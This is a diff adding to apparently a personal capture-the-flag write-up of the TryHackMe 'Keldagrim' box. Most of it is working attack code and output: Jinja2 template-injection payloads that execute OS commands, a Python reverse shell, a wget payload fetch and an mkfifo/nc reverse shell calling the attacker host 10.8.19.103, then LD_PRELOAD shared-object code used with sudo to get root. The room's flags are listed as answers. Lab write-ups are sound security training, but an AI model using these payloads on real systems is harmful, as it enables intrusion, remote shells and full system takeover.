@@ -229,3 +229,235 @@ Y29ubmVjdCgoXCIxMC44LjE5LjEwM1wiLDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3Mu
 ZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNh
 bGwoW1wiL2Jpbi9iYXNoXCJdOykucmVhZCgpLnpmaWxsKDQxNyl9fXslZW5kaWYlfXslIGVuZGZv
 ciAlfQ==
+
+give internal 500 error
+
+uploading a revshell
+```
+```text
+┌──(kali㉿kali)-[~/keldagrim]
+└─$ cat shell.py 
+import pty;
+RHOST=10.8.19.103
+RPORT=444
+import sys
+import socket
+import os
+import pty
+s=socket.socket()
+s.connect((RHOST,RPORT))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/bash")
+```
+```text
+┌──(kali㉿kali)-[~/keldagrim]
+└─$ echo -n "{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[401](["wget", "http://10.8.19.103:8000/shell.py"], stdout=-1, stderr=-1).communicate()}}" | base64
+e3tnZXRfZmxhc2hlZF9tZXNzYWdlcy5fX2NsYXNzX18uX19tcm9fX1sxXS5fX3N1YmNsYXNzZXNf
+XygpWzQwMV0oW3dnZXQsIGh0dHA6Ly8xMC44LjE5LjEwMzo4MDAwL3NoZWxsLnB5XSwgc3Rkb3V0
+PS0xLCBzdGRlcnI9LTEpLmNvbW11bmljYXRlKCl9fQ==
+
+not works so just encoded with cyberchef url encode
+and will be
+
+JTdCJTdCZ2V0X2ZsYXNoZWRfbWVzc2FnZXMuX19jbGFzc19fLl9fbXJvX18lNUIxJTVELl9fc3ViY2xhc3Nlc19fKCklNUI0MDElNUQoJTVCJTIyd2dldCUyMiwlMjAlMjJodHRwOi8vMTAuOC4xOS4xMDM6ODAwMC9zaGVsbC5weSUyMiU1RCwlMjBzdGRvdXQ9LTEsJTIwc3RkZXJyPS0xKS5jb21tdW5pY2F0ZSgpJTdEJTdE
+
+Current user - (b&#39;&#39;, b&#39;--2022-11-23 00:30:56-- http://10.8.19.103:8000/shell.py\nConnecting to 10.8.19.103:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 185 [text/x-python]\nSaving to: \xe2\x80\x98shell.py\xe2\x80\x99\n\n 0K 100% 45.0K=0.004s\n\n2022-11-23 00:30:56 (45.0 KB/s) - \xe2\x80\x98shell.py\xe2\x80\x99 saved [185/185]\n\n&#39;)
+```
+```text
+┌──(kali㉿kali)-[~/keldagrim]
+└─$ python3 -m http.server 
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.197.217 - - [22/Nov/2022 19:30:57] "GET /shell.py HTTP/1.1" 200 -
+
+so it works now execute the shell
+
+{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[401](["python3", "./shell.py"], stdout=-1, stderr=-1).communicate()}}
+
+JTdCJTdCZ2V0X2ZsYXNoZWRfbWVzc2FnZXMuX19jbGFzc19fLl9fbXJvX18lNUIxJTVELl9fc3ViY2xhc3Nlc19fKCklNUI0MDElNUQoJTVCJTIycHl0aG9uMyUyMiwlMjAlMjIuL3NoZWxsLnB5JTIyJTVELCUyMHN0ZG91dD0tMSwlMjBzdGRlcnI9LTEpLmNvbW11bmljYXRlKCklN0QlN0Q=
+
+Current user - (b&#39;&#39;, b&#39;Traceback (most recent call last):\n File &#34;./shell.py&#34;, line 9, in &lt;module&gt;\n s.connect((RHOST,RPORT))\nConnectionRefusedError: [Errno 111] Connection refused\n&#39;) 
+
+uhmm
+
+let's list
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+
+JTdCJTdCY29uZmlnLl9fY2xhc3NfXy5fX2luaXRfXy5fX2dsb2JhbHNfXyU1QidvcyclNUQucG9wZW4oJ2xzJykucmVhZCgpJTdEJTdE
+
+Current user - app shell.py shell.py.1 shell.py.2 shell.py.3 shell.py.4 user.txt 
+
+{{config.__class__.__init__.__globals__['os'].popen('cat user.txt').read()}}
+
+JTdCJTdCY29uZmlnLl9fY2xhc3NfXy5fX2luaXRfXy5fX2dsb2JhbHNfXyU1QidvcyclNUQucG9wZW4oJ2NhdCUyMHVzZXIudHh0JykucmVhZCgpJTdEJTdE
+
+flag user
+
+Current user - thm{d55ac4d0a728741d7b8c23b999e73cf3} 
+
+another revshell :)
+
+{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.19.103 4444 >/tmp/f').read()}}
+
+JTdCJTdCY29uZmlnLl9fY2xhc3NfXy5fX2luaXRfXy5fX2dsb2JhbHNfXyU1QidvcyclNUQucG9wZW4oJ3JtJTIwL3RtcC9mO21rZmlmbyUyMC90bXAvZjtjYXQlMjAvdG1wL2YlN0NzaCUyMC1pJTIwMiUzRSYxJTdDbmMlMjAxMC44LjE5LjEwMyUyMDQ0NDQlMjAlM0UvdG1wL2YnKS5yZWFkKCklN0QlN0Q=
+```
+```text
+┌──(kali㉿kali)-[~/keldagrim]
+└─$ nc -lvnp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.197.217.
+Ncat: Connection from 10.10.197.217:54934.
+sh: 0: can't access tty; job control turned off
+
+persistence
+```
+```text
+┌──(kali㉿kali)-[~/keldagrim]
+└─$ nc -lvnp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.197.217.
+Ncat: Connection from 10.10.197.217:54934.
+sh: 0: can't access tty; job control turned off
+```
+
+## Exploitation
+```text
+$ python3 -c 'import pty; pty.spawn("/bin/bash");'
+jed@keldagrim:~$ ^Z
+zsh: suspended  nc -lvnp 4444
+```
+```text
+┌──(kali㉿kali)-[~/keldagrim]
+└─$ stty raw -echo;fg;
+[1]  + continued  nc -lvnp 4444
+                               export TERM=xterm
+
+priv esc
+
+jed@keldagrim:~$ find / -perm /4000 2>/dev/null
+/bin/su
+/bin/ping
+/bin/mount
+/bin/umount
+/bin/fusermount
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/newuidmap
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/traceroute6.iputils
+/usr/bin/newgidmap
+/usr/bin/at
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/authbind/helper
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+
+jed@keldagrim:~$ sudo -l
+Matching Defaults entries for jed on keldagrim:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    env_keep+=LD_PRELOAD
+
+User jed may run the following commands on keldagrim:
+    (ALL : ALL) NOPASSWD: /bin/ps
+
+The env_keep+=LD_PRELOAD allows us to inject shared objects into processes before we run them. In case of /bin/ps which we are allowed to run as root, we can inject code that gets executed as root.
+
+https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
+```
+```text
+┌──(kali㉿kali)-[~/keldagrim]
+└─$ nano shell.c
+```
+```text
+┌──(kali㉿kali)-[~/keldagrim]
+└─$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+```text
+┌──(kali㉿kali)-[~/keldagrim]
+└─$ ls     
+shell.c  shell.py  shell.so
+```
+```text
+┌──(kali㉿kali)-[~/keldagrim]
+└─$ cat shell.c 
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setgid(0);
+        setuid(0);
+        system("/bin/bash");
+}
+
+transferring
+
+jed@keldagrim:~$ wget http://10.8.19.103:8000/shell.so
+--2022-11-23 01:13:52--  http://10.8.19.103:8000/shell.so
+Connecting to 10.8.19.103:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 14152 (14K) [application/octet-stream]
+Saving to: ‘shell.so’
+
+shell.so            100%[===================>]  13.82K  71.0KB/s    in 0.2s    
+
+2022-11-23 01:13:53 (71.0 KB/s) - ‘shell.so’ saved [14152/14152]
+```
+
+## Privilege Escalation
+```text
+┌──(kali㉿kali)-[~/keldagrim]
+└─$ python3 -m http.server 
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.197.217 - - [22/Nov/2022 19:30:57] "GET /shell.py HTTP/1.1" 200 -
+10.10.197.217 - - [22/Nov/2022 19:38:08] "GET /shell.py HTTP/1.1" 200 -
+10.10.197.217 - - [22/Nov/2022 19:40:37] "GET /shell.py HTTP/1.1" 200 -
+10.10.197.217 - - [22/Nov/2022 19:47:21] "GET /shell.py HTTP/1.1" 200 -
+10.10.197.217 - - [22/Nov/2022 19:50:47] "GET /shell.py HTTP/1.1" 200 -
+10.10.197.217 - - [22/Nov/2022 20:13:53] "GET /shell.so HTTP/1.1" 200 -
+
+jed@keldagrim:~$ mv shell.so /tmp
+jed@keldagrim:~$ cd /tmp
+jed@keldagrim:/tmp$ ls
+f
+shell.so
+systemd-private-99f3478a2d79495ab810925c7be4c32b-systemd-resolved.service-WAg8jL
+systemd-private-99f3478a2d79495ab810925c7be4c32b-systemd-timesyncd.service-Xu3h1y
+jed@keldagrim:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /bin/ps
+
+root@keldagrim:/tmp# cd /root
+root@keldagrim:/root# ls
+root.txt
+root@keldagrim:/root# cat root.txt
+thm{bf2a087f833b58df233c0f24eac3aec5}
+
+😊
+```
+![[Pasted image 20221026142628.png]]
+![[Pasted image 20221026142821.png]]
+![[Pasted image 20221026143259.png]]
+![[Pasted image 20221026143358.png]]
+![[Pasted image 20221122193156.png]]
+user.txt
+root.txt
+
+## Flags / Answers
+- ***thm{d55ac4d0a728741d7b8c23b999e73cf3}***
+- ***thm{bf2a087f833b58df233c0f24eac3aec5}***
+
+## Notes / Lessons Learned
+[[Scripting]]
+[[Ra]]
+
